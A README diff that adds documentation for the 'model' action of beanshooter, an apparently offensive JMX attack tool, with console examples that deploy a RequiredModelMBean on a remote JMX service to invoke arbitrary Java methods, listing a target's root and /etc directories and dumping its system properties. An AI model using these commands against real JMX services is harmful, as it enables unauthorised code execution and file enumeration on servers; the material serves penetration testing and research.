@@ -61,6 +61,7 @@ autocompletion.
     - [invoke](#invoke)
     - [jolokia](#jolokia)
     - [list](#list)
+    - [model](#model)
     - [serial](#serial)
     - [stager](#stager)
     - [undeploy](#undeploy)
@@ -448,6 +449,127 @@ The `list` action prints a list of all registered *MBeans* on the remote *JMX* s
 [+] 	- javax.management.MBeanServerDelegate (JMImplementation:type=MBeanServerDelegate)
 [...]
 ```
+
+#### Model
+
+The `model` action is one of the most powerful *beanshooter* operations and implements a technique
+identified by [Markus Wulftange](https://twitter.com/mwulftange) that allows you to invoke arbitrary
+*public* and *static* Java methods. Moreover, *public* object methods can also be invoked on a user
+created object instance. The only requirements are that the utilized method arguments and the provided
+object instance (for *non static* methods) are serializable.
+
+The following listing shows an example usage, where an `File` object is provided as object instance
+and the `String[] list()` operation is invoked on it:
+
+```console
+[qtc@devbox ~]$ beanshooter model 172.17.0.2 9010 de.qtc.beanshooter:version=1 java.io.File 'new java.io.File("/")'
+[+] Deploying RequiredModelMBean supporting methods from java.io.File
+[+]
+[+] 	Deplyoing MBean: RequiredModelMBean
+[+] 	MBean with object name de.qtc.beanshooter:version=1 was successfully deployed.
+[+]
+[+] 	Available Methods:
+[+] 	  - java.lang.String toString()
+[+] 	  - int hashCode()
+[+] 	  - [Ljava.lang.String; list()
+[...]
+[+] 	  - void setManagedResource(java.lang.Object, java.lang.String)
+[+]
+[+] 	Setting managed resource to: new java.io.File("/")
+[+] 	Managed resource was set successfully.
+[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 9010 de.qtc.beanshooter:version=1 --signature 'list()'
+root
+var
+opt
+srv
+bin
+mnt
+dev
+proc
+etc
+usr
+lib
+tmp
+home
+run
+media
+sbin
+sys
+.dockerenv
+```
+
+The `setManagedResource` method is always available and can be used to change the object instance to operate on:
+
+```console
+[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 9010 de.qtc.beanshooter:version=1 --signature 'setManagedResource(Object a, String b)' 'new java.io.File("/etc")' objectReference
+[+] Call was successful.
+[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 9010 de.qtc.beanshooter:version=1 --signature 'list()'
+passwd
+shells
+opt
+modules
+mtab
+issue
+inittab
+hosts
+...
+```
+
+When invoking *static* methods, an object instance is also required. However, the actual class of the object instance does
+not matter. E.g. if you want to invoke `getProperties()` from `java.lang.System`, you could also use a simple `String`
+as object instance. Only the specified class name matters in this case:
+
+```console
+[qtc@devbox ~]$ beanshooter model 172.17.0.2 9010 de.qtc.beanshooter:version=1 java.lang.System '"does not matter"'
+[+] Deploying RequiredModelMBean supporting methods from java.lang.System
+[+]
+[+] 	Deplyoing MBean: RequiredModelMBean
+[+] 	MBean with object name de.qtc.beanshooter:version=1 was successfully deployed.
+[+]
+[+] 	Available Methods:
+[+] 	  - void runFinalization()
+[+] 	  - java.lang.String setProperty(java.lang.String, java.lang.String)
+[+] 	  - java.lang.String getProperty(java.lang.String)
+[+] 	  - java.lang.String getProperty(java.lang.String, java.lang.String)
+[+] 	  - long currentTimeMillis()
+[+] 	  - long nanoTime()
+[+] 	  - java.lang.SecurityManager getSecurityManager()
+[+] 	  - void loadLibrary(java.lang.String)
+[+] 	  - java.lang.String mapLibraryName(java.lang.String)
+[+] 	  - void load(java.lang.String)
+[+] 	  - java.lang.String lineSeparator()
+[+] 	  - java.io.Console console()
+[+] 	  - java.nio.channels.Channel inheritedChannel()
+[+] 	  - java.util.Properties getProperties()
+[+] 	  - void setProperties(java.util.Properties)
+[+] 	  - java.lang.String clearProperty(java.lang.String)
+[+] 	  - java.util.Map getenv()
+[+] 	  - java.lang.String getenv(java.lang.String)
+[+] 	  - void gc()
+[+] 	  - void wait()
+[+] 	  - java.lang.String toString()
+[+] 	  - int hashCode()
+[+] 	  - java.lang.Class getClass()
+[+] 	  - void notify()
+[+] 	  - void notifyAll()
+[+] 	  - void setManagedResource(java.lang.Object, java.lang.String)
+[+]
+[+] 	Setting managed resource to: "does not matter"
+[+] 	Managed resource was set successfully.
+[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 9010 de.qtc.beanshooter:version=1 --signature 'getProperties()'
+java.vm.info
+  --> mixed mode
+java.runtime.version
+  --> 11.0.18+10-alpine-r0
+sun.io.unicode.encoding
+  --> UnicodeLittle
+...
+```
+
+If you want to know more about the technique that is implemented by the `model` action, I highly
+recommend [this blog post](TODO) by [CODE WHITE](https://www.code-white.com/en/) which explains it
+in great detail.
+
 
 #### Serial
 
